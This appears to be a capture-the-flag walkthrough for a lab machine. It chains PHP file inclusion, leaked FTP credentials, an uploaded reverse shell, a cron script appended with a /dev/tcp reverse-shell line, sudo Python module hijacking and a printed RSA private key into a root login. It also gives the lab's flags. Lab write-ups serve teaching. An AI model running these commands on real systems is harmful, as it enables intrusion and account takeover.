# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |



# RECONNAISSANCE
---

Let's visit the website:

![Pasted image 20250326151154.png](../../IMAGES/Pasted%20image%2020250326151154.png)

We got a simple website that has some posts, if we click on any of them, we can see this:

![Pasted image 20250326151222.png](../../IMAGES/Pasted%20image%2020250326151222.png)

We can see a url in the form of:

```
post.php?post=
```

This may be vulnerable to LFI, due to the way the `post.php` file display the post, let's try reading `/etc/passwd`:

![Pasted image 20250326151326.png](../../IMAGES/Pasted%20image%2020250326151326.png)

No need to even do path traversal, let's submit the request to our proxy to handle this thing easily, reading `/etc/passwd` gives us this:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
will:x:1000:1000:will:/home/will:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
```


Let's try to read `post.php` source code to find how this works:

```html 
<!doctype html>
<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="description" content="">
 <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
 <meta name="generator" content="Jekyll v4.1.1">
 <title>Corkplacemats</title>

 <link rel="canonical" href="https://getbootstrap.com/docs/4.5/examples/album/">

<link href="css/bootstrap.min.css" rel="stylesheet">

 <style>
 .bd-placeholder-img {
 font-size: 1.125rem;
 text-anchor: middle;
 -webkit-user-select: none;
 -moz-user-select: none;
 -ms-user-select: none;
 user-select: none;
 }

 @media (min-width: 768px) {
 .bd-placeholder-img-lg {
 font-size: 3.5rem;
 }
 }
 </style>
 <!-- Custom styles for this template -->
 <link href="album.css" rel="stylesheet">
 </head>
 <body>
 <header>
 <div class="collapse bg-dark" id="navbarHeader">
 <div class="container">
 <div class="row">
 <div class="col-sm-8 col-md-7 py-4">
 <h4 class="text-white">About</h4>
 </div>
 <div class="col-sm-4 offset-md-1 py-4">
 <h4 class="text-white">Contact</h4>
 <ul class="list-unstyled">
 <li><a href="#" class="text-white">Follow on Twitter</a></li>
 <li><a href="#" class="text-white">Like on Facebook</a></li>
 <li><a href="#" class="text-white">Email me</a></li>
 </ul>
 </div>
 </div>
 </div>
 </div>
 <div class="navbar navbar-dark bg-dark shadow-sm">
 <div class="container d-flex justify-content-between">
 <a href="/" class="navbar-brand d-flex align-items-center">
 <strong>Corkplacemats</strong>
 </a>
 <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarHeader" aria-controls="navbarHeader" aria-expanded="false" aria-label="Toggle navigation">
 <span class="navbar-toggler-icon"></span>
 </button>
 </div>
 </div>
</header>

<main role="main">

<div class="row">
 <div class="col-2"></div>
 <div class="col-8">
 <?php include $_GET["post"]; ?>
 </div>
</div>

</main>

<footer class="text-muted">
 <div class="container">
 <p class="float-right">
 <a href="#">Back to top</a>
 </p>
 <p>&copy; Corkplacemats 2020</p>
 </div>
</footer>
</html>

```


Vulnerability occurs in this line:


```
 <div class="col-8">
 <?php include $_GET["post"]; ?>
 </div>
```


This means the post parameter in the URL directly controls which file is included and rendered within the `<div class="col-8">` section of the HTML response. Thereâ€™s no input validation.

If we fuzz, we can find some files, such as the `robots.txt` file, which entrance is allowed:


```
ffuf -w /usr/share/dirb/wordlists/common.txt:FUZZ -u "http://10.10.70.165/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.70.165/FUZZ
 :: Wordlist : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

 [Status: 200, Size: 4826, Words: 1154, Lines: 135, Duration: 160ms]
.hta [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 165ms]
.htaccess [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 166ms]
.htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 164ms]
css [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 165ms]
images [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 160ms]
index.php [Status: 200, Size: 4826, Words: 1154, Lines: 135, Duration: 162ms]
robots.txt [Status: 200, Size: 69, Words: 4, Lines: 4, Duration: 159ms]
server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 158ms]
```

Let's start the exploitation phase.


# EXPLOITATION
---

We can check that `robots.txt` file, I tried reading `/var/log/apache2/access.log` or `/var/www/html/config.php` and many other files but none of them worked, so, let's read this to check if we can find anything to read with the LFI:

![Pasted image 20250326153726.png](../../IMAGES/Pasted%20image%2020250326153726.png)

We can read the first flag:

![Pasted image 20250326153827.png](../../IMAGES/Pasted%20image%2020250326153827.png)



```
FLAG{robots_dot_text_what_is_next}
```

Now, within this file we found another file, if we try accessing it through the normal website, we get `403` status code, but this is where the LFI comes in:

![Pasted image 20250326154000.png](../../IMAGES/Pasted%20image%2020250326154000.png)


We can find this:

```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777 
```

Got some credentials for the `ftp` service:

```
ftpuser:givemefiles777
```


![Pasted image 20250326154109.png](../../IMAGES/Pasted%20image%2020250326154109.png)

In this we can find `flag_2.txt` and a directory called files, let's read the flag first:

```
cat flag_2.txt
FLAG{ftp_you_and_me}
```

![Pasted image 20250326154317.png](../../IMAGES/Pasted%20image%2020250326154317.png)

`files` directory is empty, but it is `writable`, this means that through the LFI we can access any file we upload to it, so, let's upload a reverse shell and access the file:

![Pasted image 20250326154550.png](../../IMAGES/Pasted%20image%2020250326154550.png)

Now, let's use the LFI to access the file, but first, we need to set up our listener, once we've done it, let's submit this:

```
post=/home/ftpuser/ftp/files/shell.php
```

We can see the connection in our shell:

![Pasted image 20250326154710.png](../../IMAGES/Pasted%20image%2020250326154710.png)

Let's proceed with PrivEsc.




# PRIVILEGE ESCALATION
---


First thing to do is to get a stable shell:


1. /usr/bin/script -qc /bin/bash /dev/null
2. CTRL + Z
3. stty raw -echo; fg
4. reset xterm
5. export TERM=xterm
6. export BASH=bash

![Pasted image 20250326154811.png](../../IMAGES/Pasted%20image%2020250326154811.png)

Now, with the shell, we can start looking around, for example, we can find the third flag here:

```
www-data@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3.txt
FLAG{lfi_what_a_guy}
```

Let's get linpeas and check for any way to get into other user:

![Pasted image 20250326155501.png](../../IMAGES/Pasted%20image%2020250326155501.png)

We can run any command as `toby` with user, let's switch into `toby:

![Pasted image 20250326155620.png](../../IMAGES/Pasted%20image%2020250326155620.png)

We can now read what's in `toby`'s home:

![Pasted image 20250326155646.png](../../IMAGES/Pasted%20image%2020250326155646.png)

Let's read flag 4:

```
toby@watcher:~$ cat flag_4.txt
FLAG{chad_lifestyle}
```

We got a note, let's read it:

```
toby@watcher:~$ cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

Let's check the crontab:

```
toby@watcher:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
```

We got a script called `cow.sh` running at `jobs` directory on toby's home, let's check if we can modify this so we can get a shell as mat:

![Pasted image 20250326155955.png](../../IMAGES/Pasted%20image%2020250326155955.png)

We indeed can, let's modify it:

```
echo "/bin/bash -i >& /dev/tcp/IP/PORT 0>&1" >> /home/toby/jobs/cow.sh
```

After we set up a new listener with another port, we get this:

![Pasted image 20250326160120.png](../../IMAGES/Pasted%20image%2020250326160120.png)

There we go, we got our shell as `mat`, shell is a little unstable so we can stabilize it again:


```
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250326160254.png](../../IMAGES/Pasted%20image%2020250326160254.png)

Got the flag 5 and another note:

```
mat@watcher:~$ cat flag_5.txt
FLAG{live_by_the_cow_die_by_the_cow}
```

Let's read the note:

```
mat@watcher:~$ cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

Let's check our sudo privileges:

```
mat@watcher:~$ sudo -l
Matching Defaults entries for mat on watcher:
 env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
 (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

We can check the folder and will notice this:

![Pasted image 20250326161055.png](../../IMAGES/Pasted%20image%2020250326161055.png)

We can check both files:

```python
def get_command(num):
	if(num == "1"):
		return "ls -lah"
	if(num == "2"):
		return "id"
	if(num == "3"):
		return "cat /etc/passwd"
```

```python
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
	print("Invalid command!")
	exit()

os.system(cmd)

```

Let's modify the `cmd.py` file in the following way:

```python
import os

os.system('/bin/bash')

def get_command(num):
 if(num == "1"):
 return "ls -lah"
 if(num == "2"):
 return "id"
 if(num == "3"):
 return "cat /etc/passwd"
```

Now, let's run the script:

```
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```

We can see this:

![Pasted image 20250326162027.png](../../IMAGES/Pasted%20image%2020250326162027.png)

We got a shell as `will`, let's work our way into root from here:

```
will@watcher:/home/will$ cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
```

No note in this point, let's use linpeas again:

![Pasted image 20250326162839.png](../../IMAGES/Pasted%20image%2020250326162839.png)

We can find something called `key.b64` if we decode the contents of it, we can see the following:

```
echo 'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu
TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ
T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw
bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR
QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3
YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H
VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR
cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5
cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3
c1VBODUrdnFORnJ4ekZZL3RXMTg4VzAwZ3k5dzUxYktTS0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS
QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO
dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI
UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2
TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB
QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ
TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj
dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz
K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu
U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=' | base64 -d

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/c
q3X7D50gikpEZEUeIMPPjPcUNGUKaXoaX5n2XaYBtQiRR6Z1wvASO0uEn7PIq2cz
BQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0Q
TQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B6
1wsUA85+vqNFrxzFY/tW188W00gy9w51bKSKDxboti2gdgmFolpnFw+t0QRB5RCF
AlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5
fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2
Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE
7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1
vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpI
UbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4D
SPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9Q
A/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZ
gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----
```

This is an `id_rsa`, probably from root since the folder is owned by root, let's try accessing root ssh using this key:

```
echo 'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu
TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ
T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw
bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR
QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3
YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H
VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR
cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5
cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3
c1VBODUrdnFORnJ4ekZZL3RXMTg4VzAwZ3k5dzUxYktTS0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS
QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO
dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI
UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2
TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB
QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ
TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj
dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz
K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu
U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id-rsa; chmod 600 id_rsa
```

Now, let's access root:

![Pasted image 20250326163020.png](../../IMAGES/Pasted%20image%2020250326163020.png)

It worked, we finally got root, let's read final flag:

```
root@watcher:~# cat flag_7.txt
FLAG{who_watches_the_watchers}
```

![Pasted image 20250326163056.png](../../IMAGES/Pasted%20image%2020250326163056.png)

